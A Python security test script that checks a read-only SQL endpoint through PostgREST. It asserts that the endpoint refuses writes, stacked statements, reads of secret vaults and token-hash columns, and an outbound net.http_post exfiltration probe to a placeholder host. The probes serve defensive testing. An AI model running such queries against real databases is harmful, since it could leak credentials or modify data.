#!/usr/bin/env python3
"""#172 team_sql contract — `python3 scripts/test_172_team_sql.py; echo EXIT=$?`

Live checks through PostgREST with the service key against digest.team_sql, the read-only SQL
surface of Team research mode (scripts/sql/20260911_team_sql_172.sql). Every check is a security
property or a trap the design named. Before the migration every check must FAIL with HTTP 404
("Could not find the function"); after it, all green and EXIT=0.

PostgREST maps SQLSTATEs to HTTP statuses (42501 → 403, 25006 → 405, 42P01/42883 → 404, other
42* → 400), so each refusal is asserted on BOTH the status and the SQLSTATE in the body.

Check 3 is the MERGE BLOCKER: if a data-modifying CTE is not refused with 25006, the read-only
transaction does not bind inside PostgREST's transaction — stop and escalate, do not build the route.
"""
import json
import os
import subprocess
import sys
import time

ENV = "/Users/Born/mds-digest-web/.env.local"
HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
try:
    from olivia_leak_gate import ANON_KEY  # the public anon key, same constant the gate uses
except Exception:  # pragma: no cover — the gate is always beside this file
    ANON_KEY = ""


def env(k):
    for line in open(ENV):
        if line.startswith(k + "="):
            return line.split("=", 1)[1].strip().strip('"').strip("'")
    sys.exit(f"missing {k} in {ENV}")


BASE = env("SUPABASE_URL").rstrip("/") + "/rest/v1"
KEY = env("SUPABASE_SECRET_KEY")


def team_sql(sql, key=KEY, max_rows=200, timeout=90):
    t0 = time.time()
    p = subprocess.run(
        ["curl", "-sS", "-m", str(timeout), "-w", "\n%{http_code}", "-X", "POST", f"{BASE}/rpc/team_sql",
         "-H", f"apikey: {key}", "-H", f"Authorization: Bearer {key}",
         "-H", "Accept-Profile: digest", "-H", "Content-Profile: digest",
         "-H", "Content-Type: application/json",
         "--data-binary", json.dumps({"p_sql": sql, "p_max_rows": max_rows})],
        capture_output=True, text=True)
    raw, _, code = p.stdout.rpartition("\n")
    try:
        body = json.loads(raw) if raw.strip() else None
    except json.JSONDecodeError:
        body = raw[:300]
    try:
        status = int(code)
    except ValueError:
        status = 0  # transport failure / timeout — no HTTP status at all
    return status, body, round(time.time() - t0, 1)


fails = 0


def check(label, ok, detail):
    global fails
    if not ok:
        fails += 1
    print(f"{'ok  ' if ok else 'FAIL'}  {label}: {detail}")


def code_of(b):
    return str((b or {}).get("code", "")) if isinstance(b, dict) else ""


def first_n(b):
    try:
        return b["rows"][0]["n"]
    except (KeyError, IndexError, TypeError):
        return None


def refused(st, b, status, sqlstate):
    return st == status and code_of(b) == sqlstate


# --- reads --------------------------------------------------------------------------------------
st, b, _ = team_sql("select count(*) as n from digest.member_attributes")
n = first_n(b)
check("1 reads a table as the role (member_attributes count)", st == 200 and isinstance(n, int) and n >= 5000,
      f"{st} n={n}")

# --- writes: the pre-check, then the transaction itself -----------------------------------------
st, b, _ = team_sql("insert into digest.chats(chat_id, chat_name) values ('gate-172','gate-172')")
check("2 a plain INSERT is refused by the SELECT-only pre-check (42501)", refused(st, b, 403, "42501") and "team_sql" in json.dumps(b),
      f"{st} {json.dumps(b)[:140]}")

# The wrapper nests every statement inside `select * from (...) q`, and Postgres refuses a data-modifying
# CTE anywhere but the top level (0A000) — so a write cannot even be PARSED through the tool. (First run
# 2026-09-10 expected 25006 here; the structural refusal fires first.)
st, b, _ = team_sql("with w as (insert into digest.chats(chat_id, chat_name) values ('gate-172','gate-172') returning chat_id) select * from w")
check("3 a data-modifying CTE cannot be nested inside the wrapper (0A000) — structural, before any privilege",
      refused(st, b, 400, "0A000"), f"{st} {json.dumps(b)[:140]}")
if st == 200:
    print("      !!! STOP: the write went through — escalate; do not build the route.")

# THE read-only proof (merge blocker). pg_net's http_post is PUBLIC-executable and callable from a plain
# SELECT; its enqueue is an INSERT into net.http_request_queue, and the read-only check runs before the
# privilege check — so 25006 here proves transaction_read_only binds inside PostgREST's transaction AND
# closes the one outbound-HTTP (exfiltration) channel the role can name.
st, b, _ = team_sql("select net.http_post('https://example.invalid/172', '{}'::jsonb) as id")
check("4 the READ-ONLY TRANSACTION binds: net.http_post cannot enqueue (25006) — merge blocker",
      refused(st, b, 405, "25006"), f"{st} {json.dumps(b)[:140]}")
if st == 200:
    print("      !!! STOP: the enqueue went through — transaction_read_only does not bind inside PostgREST. Escalate; do not build the route.")

st, b, _ = team_sql("select 1; select 2")
check("5 a second statement is a syntax error (42601)", refused(st, b, 400, "42601"), f"{st} {json.dumps(b)[:120]}")

# --- what stays dark ----------------------------------------------------------------------------
st, b, _ = team_sql("select * from vault.decrypted_secrets limit 1")
check("6 vault is dark (42501 or 3F000)", refused(st, b, 403, "42501") or refused(st, b, 400, "3F000"),
      f"{st} {json.dumps(b)[:120]}")

st, b, _ = team_sql("select * from digest.meta_webhook_config()")
check("7 secret-returning functions are dark (meta_webhook_config → 42501)", refused(st, b, 403, "42501"),
      f"{st} {json.dumps(b)[:120]}")

st, b, _ = team_sql("select otp_code_hash from digest.members limit 1")
check("8 OTP hash columns are dark (42501)", refused(st, b, 403, "42501"), f"{st} {json.dumps(b)[:120]}")

st, b, _ = team_sql("select token_hash from digest.member_sessions limit 1")
check("9 session token hashes are dark (42501)", refused(st, b, 403, "42501"), f"{st} {json.dumps(b)[:120]}")

st, b, _ = team_sql("select id from digest.olivia_web_messages limit 1")
check("10 olivia_web_messages is dark (42501)", refused(st, b, 403, "42501"), f"{st} {json.dumps(b)[:120]}")

st, b, _ = team_sql("select at_member_id from digest.member_profiles limit 1")
check("11 member_profiles TABLE is dark; the view is the door (42501)", refused(st, b, 403, "42501"),
      f"{st} {json.dumps(b)[:120]}")

# --- the deny-list view -------------------------------------------------------------------------
st, b, _ = team_sql("select count(*) as n from digest.member_profiles_team where at_fields ? 'Removal Reason'")
check("12 the deny-list view drops 'Removal Reason' from at_fields", st == 200 and first_n(b) == 0, f"{st} n={first_n(b)}")

st, b, _ = team_sql("select count(*) as n from digest.member_profiles_team where at_fields ? 'Most Recent Revenue'")
check("13 the deny-list view keeps 'Most Recent Revenue' (the category #172 opens)", st == 200 and (first_n(b) or 0) > 900,
      f"{st} n={first_n(b)}")

# --- the wrapper ---------------------------------------------------------------------------------
st, b, _ = team_sql("select id from digest.content_items order by id limit 500", max_rows=200)
check("14 LIMIT wrapper: 500 asked, 200 returned, truncated=true",
      st == 200 and isinstance(b, dict) and b.get("row_count") == 200 and b.get("truncated") is True, f"{st} {str(b)[:80]}")

st, b, _ = team_sql("select 1 as one -- a trailing line comment")
check("15 a trailing line comment does not swallow the wrapper", st == 200 and isinstance(b, dict) and b.get("row_count") == 1,
      f"{st} {str(b)[:80]}")

# --- who may call it, and what the role may never do ---------------------------------------------
st, b, _ = team_sql("select 1 as one", key=ANON_KEY or "x")
check("16 anon key is refused", st in (401, 403, 404), f"{st}")

st, b, _ = team_sql("select has_schema_privilege('millie_team_ro', 'digest', 'CREATE') or has_schema_privilege('millie_team_ro', 'event', 'CREATE') as can_create")
_cc = (b.get("rows") or [{}])[0].get("can_create") if isinstance(b, dict) else None
check("18 the role holds no CREATE on digest or event (granted for the ownership hand-off only, then revoked)",
      st == 200 and _cc is False, f"{st} can_create={_cc}")

# --- the cap (last: it takes 55 s) --------------------------------------------------------------
st, b, secs = team_sql("select pg_sleep(55), 1 as one", timeout=120)
print(f"      pg_sleep(55) → HTTP {st} after {secs}s (records the HTTP-edge cap for a long RPC; 200 or a timeout are both facts)")
check("17 a long query is answered or cut with an HTTP status, never silent", st != 0, f"{st} after {secs}s")

print("all green" if not fails else f"{fails} failing")
sys.exit(1 if fails else 0)
